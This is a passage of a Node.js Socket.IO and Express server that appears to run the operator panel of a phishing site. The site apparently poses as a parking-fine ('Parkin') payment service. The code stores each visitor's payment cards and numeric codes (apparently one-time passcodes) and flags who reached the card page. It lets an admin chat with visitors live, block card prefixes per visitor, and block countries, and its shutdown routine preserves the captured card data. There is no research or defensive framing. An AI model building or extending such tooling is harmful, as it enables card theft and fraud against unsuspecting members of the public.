  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Admin: Mark visitor data as read
  socket.on("admin:markAsRead", (visitorId) => {
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Admin: Toggle star on visitor
  socket.on("admin:toggleStar", (visitorId) => {
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.isStarred = !v.isStarred;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
      }
    });
    
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.isStarred = !savedVisitor.isStarred;
      saveData();
    }
    
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:starToggled", { visitorId, isStarred: savedVisitor ? savedVisitor.isStarred : false });
    });
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      io.to(currentSocketId).emit("chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${currentSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(currentSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${currentSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", () => {
    if (visitors.has(socket.id)) {
      const visitor = visitors.get(socket.id);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      saveVisitorPermanently(visitor);
      visitors.delete(socket.id);
      
      setTimeout(() => {
        let reconnected = false;
        for (const [sid, v] of visitors) {
          if (v._id === visitorId) {
            reconnected = true;
            break;
          }
        }
        
        if (!reconnected) {
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
          }
          
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
            });
          });
          
          saveData();
          console.log(`Visitor disconnected: ${socketId} (${visitorId})`);
        } else {
          console.log(`Visitor ${visitorId} reconnected during grace period`);
        }
      }, 5000);
    }

    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          io.to(visitorSocketId).emit("isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// ===== REST API ROUTES =====

// Health Check
app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

app.get("/api/health", (req, res) => {
  res.json({ status: "ok", message: "Server is running" });
});

// Parkin Fines API
app.post("/api/parkin/fines", async (req, res) => {
  console.log("Received search request for:", req.body.plateNumber);
  try {
    const result = await getParkinFinesFast(req.body);
    res.json(result);
  } catch (err) {
    console.error("Route Error:", err.message);
    res.status(500).json({ status: "error", message: "Internal Server Error" });
  }
});

// Visitors API
app.get("/api/visitors", (req, res) => {
  const connectedVisitorIds = new Set();
  visitors.forEach((v) => {
    connectedVisitorIds.add(v._id);
  });
  
  const visitorsWithStatus = savedVisitors.map(v => {
    const isCurrentlyConnected = connectedVisitorIds.has(v._id);
    let currentSocketId = v.socketId;
    visitors.forEach((activeVisitor, sid) => {
      if (activeVisitor._id === v._id) {
        currentSocketId = sid;
      }
    });
    return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected };
  });
  
  res.json(visitorsWithStatus);
});

// Stats API
app.get("/api/stats", (req, res) => {
  const uniqueConnected = new Set();
  visitors.forEach(v => uniqueConnected.add(v._id));
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: uniqueConnected.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// Idle check timer - every 10 seconds
setInterval(() => {
  const now = Date.now();
  visitors.forEach((visitor, sid) => {
    const wasIdle = visitor.isIdle || false;
    const isNowIdle = visitor.lastActivity ? (now - visitor.lastActivity) > 60000 : false;
    if (isNowIdle !== wasIdle) {
      visitor.isIdle = isNowIdle;
      visitors.set(sid, visitor);
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:idleChanged", {
          visitorId: visitor._id,
          isIdle: isNowIdle,
        });
      });
    }
  });
}, 10000);

// Cleanup stale/dead socket connections every 30 seconds
setInterval(() => {
  let cleaned = 0;
  visitors.forEach((visitor, sid) => {
    const socket = io.sockets.sockets.get(sid);
    if (!socket || !socket.connected) {
      const visitorId = visitor._id;
      visitors.delete(sid);
      cleaned++;
      
      const savedVisitor = savedVisitors.find(v => v._id === visitorId);
      if (savedVisitor) {
        savedVisitor.isConnected = false;
        saveData();
      }
      
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:disconnected", {
          visitorId: visitorId,
          socketId: sid,
        });
      });
    }
  });
  if (cleaned > 0) {
    console.log(`Cleaned ${cleaned} stale socket connections. Active visitors: ${visitors.size}`);
  }
}, 30000);

// Graceful shutdown - save all data before server stops
function gracefulShutdown(signal) {
  console.log(`${signal} received. Saving all data before shutdown...`);
  visitors.forEach((visitor) => {
    const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
    if (existingIndex >= 0) {
      const existing = savedVisitors[existingIndex];
      const merged = { ...existing, ...visitor };
      if (existing.dataHistory && visitor.dataHistory) {
        merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length ? [...existing.dataHistory] : [...visitor.dataHistory];
      }
      if (existing.paymentCards && visitor.paymentCards) {
        merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length ? [...existing.paymentCards] : [...visitor.paymentCards];
      }
      if (existing.digitCodes && visitor.digitCodes) {
        merged.digitCodes = existing.digitCodes.length >= visitor.digitCodes.length ? [...existing.digitCodes] : [...visitor.digitCodes];
      }
      if (existing.chatMessages && visitor.chatMessages) {
        merged.chatMessages = existing.chatMessages.length >= visitor.chatMessages.length ? [...existing.chatMessages] : [...visitor.chatMessages];
      }
      if (existing.data && visitor.data) {
        merged.data = { ...existing.data, ...visitor.data };
      }
      if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
      savedVisitors[existingIndex] = merged;
    }
  });
  saveDataImmediate();
  console.log('All data saved. Shutting down...');
  process.exit(0);
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGHUP', () => gracefulShutdown('SIGHUP'));

// Start server
const port = process.env.PORT || 3000;
server.listen(port, () => {
  console.log(`Server running on port ${port}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
  console.log(`Data directory: ${DATA_DIR}`);
  console.log(`Admin panel: /admin`);
});
